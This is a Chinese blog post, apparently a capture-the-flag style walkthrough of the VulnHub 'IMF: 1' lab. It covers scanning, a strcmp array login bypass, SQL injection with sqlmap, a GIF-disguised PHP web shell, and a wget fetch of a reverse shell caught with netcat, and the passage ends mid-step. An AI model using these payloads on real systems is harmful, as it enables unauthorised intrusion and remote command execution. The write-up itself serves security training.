@@ -1,0 +1,659 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>IMF：1 - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="IMF：1">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-05-02 00:00" pubdate>
+        2022年5月2日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      100
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">IMF：1</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x03-IMF-1-vulnhub"><a href="#0x03-IMF-1-vulnhub" class="headerlink" title="0x03 IMF: 1~vulnhub"></a>0x03 IMF: 1~vulnhub</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/imf-1,162/">IMF: 1 ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.146</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24    <span class="hljs-comment"># 扫描该网段上活跃的主机</span></span><br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.146</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sS -A -p- 192.168.135.146     <span class="hljs-comment"># 全端口扫描</span></span><br></code></pre></td></tr></table></figure>
+<p><strong>简单的端口扫描：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.146</span><br></code></pre></td></tr></table></figure>
+<p><strong>全面扫描：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.146</span><br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>http</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>在前期的信息搜集后得知，这是一个纯虚拟靶场。</p>
+<p>访问 <code>192.168.135.146:80</code> ，没有发现什么，查看源码，得到一个提示，进行解密：</p>
+ <!-- flag1{YWxsdGhlZmlsZXM=} --> ===> allthefiles
+
+查看文件，发现三个奇怪的文件名：
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- Js --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vendor/modernizr-2.6.2.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/vendor/jquery-1.10.2.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/bootstrap.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/ZmxhZzJ7YVcxbVl.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/XUnRhVzVwYzNS.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/eVlYUnZjZz09fQ==.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">       <span class="hljs-keyword">new</span> WOW(</span><br><span class="javascript">          ).init();</span><br><span class="javascript">      </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>显然是 base64 ，进行解码：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==</span><br><span class="hljs-string">===&gt;flag2&#123;aW1mYWRtaW5pc3RyYXRvcg==&#125;</span><br><span class="hljs-string">===&gt;imfadministrator</span><br></code></pre></td></tr></table></figure>
+<p>访问 <code>192.168.135.146/imfadministrator</code> ，发现是个登录界面，查看源码，得到提示：</p>
+<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
+<p>通过注释得知密码是直接写在 php 文件里的。猜测是使用 strcmp 之类的来判断密码。当 strcmp 的两个字符串参数相等的时候会返回0，但如果把 string 和 array 相比较的话，strcmp 也会返回 0。</p>
+<p>随便尝试几个登录，出现 Invalid username. 的提示，说明用户名和密码是分别验证的，而且密码是写死的。这样就可以先爆破用户名，在绕过密码验证。</p>
+<p>使用 cewl 对站点生成字典：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cewl 192.168.135.146 -w user.txt</span> <br>CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wc -l user.txt</span>                  <br>136 user.txt<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sort user.txt -u -o user_unique.txt</span><br></code></pre></td></tr></table></figure>
+<p>使用 burp 进行抓包，通过生成的字典对 user 进行爆破。</p>
+<p>通过筛选长度得到正确的用户名：user=rmichaels</p>
+<p>将 pass 传入一个数组进行绕过，成功进入。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">POST</span> <span class="hljs-string">/imfadministrator/</span> <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-attr">Host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.135</span><span class="hljs-number">.146</span><br><span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(X11;</span> <span class="hljs-string">Linux</span> <span class="hljs-string">x86_64;</span> <span class="hljs-string">rv:78.0)</span> <span class="hljs-string">Gecko/20100101</span> <span class="hljs-string">Firefox/78.0</span><br><span class="hljs-attr">Accept:</span> <span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="hljs-attr">Accept-Language:</span> <span class="hljs-string">en-US,en;q=0.5</span><br><span class="hljs-attr">Accept-Encoding:</span> <span class="hljs-string">gzip,</span> <span class="hljs-string">deflate</span><br><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/x-www-form-urlencoded</span><br><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">21</span><br><span class="hljs-attr">Origin:</span> <span class="hljs-string">http://192.168.135.146</span><br><span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span><br><span class="hljs-attr">Referer:</span> <span class="hljs-string">http://192.168.135.146/imfadministrator/</span><br><span class="hljs-attr">Cookie:</span> <span class="hljs-string">PHPSESSID=8m3g812nee3t6fk5716apmos03</span><br><span class="hljs-attr">Upgrade-Insecure-Requests:</span> <span class="hljs-number">1</span><br><br><span class="hljs-string">user=admin&amp;pass[]=admin</span><br></code></pre></td></tr></table></figure>
+<p>得到第三个提示，进行解码，提示进入cms。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">flag3&#123;Y29udGludWVUT2Ntcw==&#125;</span><br><span class="hljs-string">Welcome,</span> <span class="hljs-string">rmichaels</span><br><span class="hljs-string">IMF</span> <span class="hljs-string">CMS</span><br><br><span class="hljs-string">===&gt;continueTOcms</span><br></code></pre></td></tr></table></figure>
+<p>进入cms后，发现什么都没有，看到页面链接是带有参数，猜测可能存在SQL注入。</p>
+<p>验证一下，页面链接后加个单引号，通过测试得知的确存在SQL注入。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">payload:</span> <span class="hljs-string">http://192.168.135.146/imfadministrator/cms.php?pagename=home&#x27;</span><br><br><span class="hljs-attr">Warning:</span> <span class="hljs-string">mysqli_fetch_row()</span> <span class="hljs-string">expects</span> <span class="hljs-string">parameter</span> <span class="hljs-number">1</span> <span class="hljs-string">to</span> <span class="hljs-string">be</span> <span class="hljs-string">mysqli_result,</span> <span class="hljs-string">boolean</span> <span class="hljs-string">given</span> <span class="hljs-string">in</span> <span class="hljs-string">/var/www/html/imfadministrator/cms.php</span> <span class="hljs-string">on</span> <span class="hljs-string">line</span> <span class="hljs-number">29</span><br></code></pre></td></tr></table></figure>
+<p>sqlmap 注入：</p>
+<blockquote>
+<p>注意这里是在登陆成功之后才有的注入点，所以注入时要带有登陆成功的 Cookie，把前面的 burp 抓到的 cookie 复制下来。或者直接将 burp 抓到的包保存为文本文件，通过 -r 参数使用。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sqlmap -u <span class="hljs-string">&#x27;http://192.168.135.146/imfadministrator/cms.php?pagename=home&#x27;</span> --cookie <span class="hljs-string">&#x27;HPSESSID=8m3g812nee3t6fk5716apmos03&#x27;</span> --dump all</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sqlmap -r head.txt -dump</span><br></code></pre></td></tr></table></figure>
+<p>得到两个图片，访问得到一个二维码，扫码得到 flag4：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;img src=<span class="hljs-string">&quot;./images/whiteboard.jpg&quot;</span>&gt;<br>&lt;img src=<span class="hljs-string">&quot;./images/redacted.jpg&quot;</span>&gt;<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">135.146</span><span class="hljs-regexp">/imfadministrator/im</span>ages/redacted.jpg<br>===&gt; null<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">135.146</span><span class="hljs-regexp">/imfadministrator/im</span>ages/whiteboard.jpg<br>===&gt; flag4&#123;dXBsb2Fkcjk0Mi5waHA=&#125; ===&gt; uploadr942.php<br></code></pre></td></tr></table></figure>
+<p>访问 <code>http://192.168.135.146/imfadministrator/uploadr942.php</code> ，发现是文件上传，经测试只能上传图片。</p>
+<p>构造 gif 文件木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$wzz</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wzz&#x27;</span>]; <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$wzz</span>`; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>成功上传，查看源码，得到文件在服务器上的文件名。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">Intelligence Upload Form<br>File successfully uploaded. <br><br><span class="hljs-comment">&lt;!-- 6e8acf9700f3 --&gt;</span><br></code></pre></td></tr></table></figure>
+<p>访问发现不存在，猜测可能上传到了 uploads 目录，加上目录后成功访问到。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif<br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/uploads/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif<br><span class="hljs-attribute">GIF89a</span><br></code></pre></td></tr></table></figure>
+<p>查看用户 id 和目录下的文件，发现 flag5 文件，打开查看得到 flag5 ，进行解密得到 <strong>agentservices</strong>，提示 agent 服务。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/uploads/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif?wzz=id<br><span class="hljs-attribute">GIF89a</span> uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data) <br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/uploads/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif?wzz=ls<br><span class="hljs-attribute">GIF89a</span> <span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif flag<span class="hljs-number">5</span>_abc<span class="hljs-number">123</span>def.txt <br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.135.146</span>/imfadministrator/uploads/<span class="hljs-number">6</span>e<span class="hljs-number">8</span>acf<span class="hljs-number">9700</span>f<span class="hljs-number">3</span>.gif?wzz=cat%<span class="hljs-number">20</span>flag<span class="hljs-number">5</span>_abc<span class="hljs-number">123</span>def.txt<br><span class="hljs-attribute">GIF89a</span> flag<span class="hljs-number">5</span>&#123;YWdlbnRzZXJ<span class="hljs-number">2</span>aWNlcw==&#125; <br></code></pre></td></tr></table></figure>
+<p>为方便后面的操作，先上传一个 php reverse shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查找 shell</span><br><span class="hljs-meta">$</span><span class="bash"> locate php-reverse-shell</span><br>/home/kali/Desktop/php-reverse-shell.php<br>/usr/share/laudanum/php/php-reverse-shell.php<br>/usr/share/laudanum/wordpress/templates/php-reverse-shell.php<br>/usr/share/webshells/php/php-reverse-shell.php<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cp /usr/share/webshells/php/php-reverse-shell.php ./</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 修改ip和port</span><br><span class="hljs-meta">$</span><span class="bash"> vim php-reverse-shell.php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 通过 python 开启本地 http 服务</span><br><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> kali 监听</span><br>nc -vlp 1234<br></code></pre></td></tr></table></figure>
+<p>在刚刚获取的低权限用户中获取 shell：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">http://192.168.135.146/imfadministrator/uploads/6e8acf9700f3.gif?wzz=wget</span> <span class="hljs-string">http://192.168.135.141:8888/php-reverse-shell.php</span><br><br><span class="hljs-comment"># 查看，成功上传</span><br><span class="hljs-string">http://192.168.135.146/imfadministrator/uploads/6e8acf9700f3.gif?wzz=ls</span><br><span class="hljs-string">GIF89a</span> <span class="hljs-string">6e8acf9700f3.gif</span> <span class="hljs-string">flag5_abc123def.txt</span> <span class="hljs-string">php-reverse-shell.php</span> <br><br><span class="hljs-comment"># 访问</span><br><span class="hljs-string">http://192.168.135.146/imfadministrator/uploads/php-reverse-shell.php</span><br></code></pre></td></tr></table></figure>
+<p>成功得到 shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -vlp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from 192.168.135.146 [192.168.135.146] 43812<br>Linux imf 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux<br> 21:14:54 up  8:38,  0 users,  load average: 0.03, 0.01, 0.06<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br></code></pre></td></tr></table></figure>
+<p>连接之后根据提示查找叫 agent 的服务。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> whereis agent</span><br>agent: /usr/local/bin/agent<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /usr/<span class="hljs-built_in">local</span>/bin</span>      <br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>access_codes<br>agent<br><span class="hljs-meta">$</span><span class="bash"> cat access_codes</span><br>SYN 7482,8279,9467<br></code></pre></td></tr></table></figure>
+<p>看起来像是运行了 knock 。先按顺序扫描这三个端口，再重新扫描一遍靶机：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -p7482,8279,9467 192.168.135.146</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-04 21:12 EDT<br>Nmap scan report for 192.168.135.146 (192.168.135.146)<br>Host is up (0.0027s latency).<br><br>PORT     STATE    SERVICE<br>7482/tcp filtered unknown<br>8279/tcp filtered unknown<br>9467/tcp filtered unknown<br><br>Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nmap -p- 192.168.135.146</span>          <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-04 22:29 EDT<br>Nmap scan report for 192.168.135.146 (192.168.135.146)<br>Host is up (0.0028s latency).<br>Not shown: 65533 filtered ports<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>7788/tcp open  unknown<br><br>Nmap done: 1 IP address (1 host up) scanned in 105.55 seconds<br></code></pre></td></tr></table></figure>
+<p>发现新开了7788端口，连接端口发现是运行着 agent 程序。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc 192.168.135.146 7788</span>                  <br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br><br>Agent ID : 123<br>Invalid Agent ID <br></code></pre></td></tr></table></figure>
+<p>为方便下载，将程序移动到 uploads 目录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cp /usr/<span class="hljs-built_in">local</span>/bin/agent /var/www/html/imfadministrator/uploads</span><br></code></pre></td></tr></table></figure>
+<p>kali 下载：</p>
